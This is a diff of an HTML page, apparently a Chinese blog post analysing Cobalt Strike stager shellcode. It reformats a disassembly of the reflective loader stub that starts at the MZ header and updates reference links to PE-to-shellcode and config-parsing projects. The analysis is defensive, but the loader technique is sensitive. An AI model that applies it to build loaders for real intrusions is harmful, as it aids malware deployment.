-<span class="number">0x0000f</span>:  <span class="number">81</span> C3 <span class="number">55</span> <span class="number">91</span> <span class="number">00</span> <span class="number">00</span>  <span class="keyword">add</span>  <span class="built_in">ebx</span>, <span class="number">0x9155</span> <span class="comment">;跳到Stub</span>
-<span class="number">0x00015</span>:  FF D3              <span class="keyword">call</span> <span class="built_in">ebx</span>         
-<span class="number">0x00017</span>:  <span class="number">68</span> F0 B5 A2 <span class="number">56</span>     <span class="keyword">push</span> <span class="number">0x56a2b5f0</span>
-<span class="number">0x0001c</span>:  <span class="number">68</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>     <span class="keyword">push</span> <span class="number">4</span>
-<span class="number">0x00021</span>:  <span class="number">57</span>                 <span class="keyword">push</span> <span class="built_in">edi</span>
-<span class="number">0x00022</span>:  FF D0              <span class="keyword">call</span> <span class="built_in">eax</span>      <span class="comment">;同样地用Hash调用函数</span>
+<pre><code class="lang-x86asm">0x00000:  4D                 dec  ebp    ;&quot;M&quot;
+0x00001:  5A                 pop  edx    ;&quot;Z&quot;
+0x00002:  E8 00 00 00 00     call 7      ;call下一行，即下一行地址入栈
+0x00007:  5B                 pop  ebx    ;ebx=下一行地址   
+0x00008:  89 DF              mov  edi, ebx ;
+0x0000a:  52                 push edx    ;抵消pop edx
+0x0000b:  45                 inc  ebp    ;抵消dec ebp
+0x0000c:  55                 push ebp    ;保存栈底
+0x0000d:  89 E5              mov  ebp, esp ;调整栈帧
+0x0000f:  81 C3 55 91 00 00  add  ebx, 0x9155 ;跳到Stub
+0x00015:  FF D3              call ebx         
+0x00017:  68 F0 B5 A2 56     push 0x56a2b5f0
+0x0001c:  68 04 00 00 00     push 4
+0x00021:  57                 push edi
+0x00022:  FF D0              call eax      ;同样地用Hash调用函数
 </code></pre>
-<p>同样的，开源项目<a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="noopener">[PE_TO_SHELLCODE]</a>可以将PE转换为Shellcode，其思路大致一致，将充当<code>PE Loader</code>作用的Stub放到了PE文件末尾，理由DOS头的Shellcode跳转到Stub加载PE文件到内存并跳转到程序入口。</p>
+<p>同样的，开源项目<a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="noopener">[PE_TO_SHELLCODE]</a>可以将PE转换为Shellcode，其思路大致一致，将充当<code>PE Loader</code>作用的Stub放到了PE文件末尾，理由DOS头的Shellcode跳转到Stub加载PE文件到内存并跳转到程序入口。 </p>
 <p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201022193600401.png" alt="image-20201022193600401"></p>
 <p>后续便是一系列的C&amp;C通信步骤，<strong>至此Shellcode分析结束</strong> 。</p>
 <p>具体PE文件中包含的配置信息是如何解析的，请参考开源项目<a href="https://github.com/Sentinel-One/CobaltStrikeParser" target="_blank" rel="noopener">[CobaltStrikeParser]</a></p>
 <div style="page-break-after: always;"></div> 
-<h2 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h2>
-<p><a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/190128-inmemoryordermodulelist-documentation-im-confused.html" target="_blank" rel="noopener">InMemoryOrderModuleList Documentation - I’m confused</a></p>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/190128-inmemoryordermodulelist-documentation-im-confused.html" target="_blank" rel="noopener">InMemoryOrderModuleList Documentation - I’m confused</a></p>
 <p><a href="https://0xevilc0de.com/locating-dll-name-from-the-process-environment-block-peb/" target="_blank" rel="noopener">[JOSH STROSCHEIN] - Locating DLL Name from the Process Environment Block (PEB) </a></p>
 <p><a href="https://www.cnblogs.com/dsky/archive/2012/02/23/2364503.html" target="_blank" rel="noopener">[梦想SKY] - 通过PEB的Ldr枚举进程内所有已加载的模块</a></p>
 <p><a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener">[Microsoft] - PE Format</a></p>
@@ -865,20 +840,5 @@ $$</p>
 <script>hljs.highlightAll();</script>
 
     </div>
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
